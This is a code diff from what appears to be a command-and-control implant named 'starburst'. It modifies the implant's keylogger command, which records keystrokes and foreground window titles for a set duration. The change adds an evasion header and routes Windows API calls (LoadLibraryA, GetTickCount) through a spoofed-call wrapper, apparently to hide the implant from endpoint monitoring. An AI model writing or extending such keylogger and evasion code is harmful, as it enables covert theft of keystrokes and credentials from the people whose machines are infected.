@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_KEYLOG
 
@@ -29,7 +30,7 @@ auto declfn starburst::cmd_keylog(
     DBG_PRINT( inst, "cmd_keylog: duration=%u seconds\n", duration );
 
     STK_USER32(_n);
-    auto h_user32 = inst.kernel32.LoadLibraryA( _n );
+    auto h_user32 = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n );
     if ( !h_user32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "failed to load user32.dll" ) ) );
@@ -69,10 +70,10 @@ auto declfn starburst::cmd_keylog(
     HWND last_window = nullptr;
     char win_title[256] = { 0 };
 
-    DWORD start_tick = inst.kernel32.GetTickCount();
+    DWORD start_tick = (DWORD)SCALL( inst, kernel32.GetTickCount );
     DWORD end_tick   = start_tick + ( duration * 1000 );
 
-    while ( inst.kernel32.GetTickCount() < end_tick ) {
+    while ( (DWORD)SCALL( inst, kernel32.GetTickCount ) < end_tick ) {
         // check for foreground window change
         HWND cur_window = pGetForegroundWindow();
         if ( cur_window && cur_window != last_window ) {
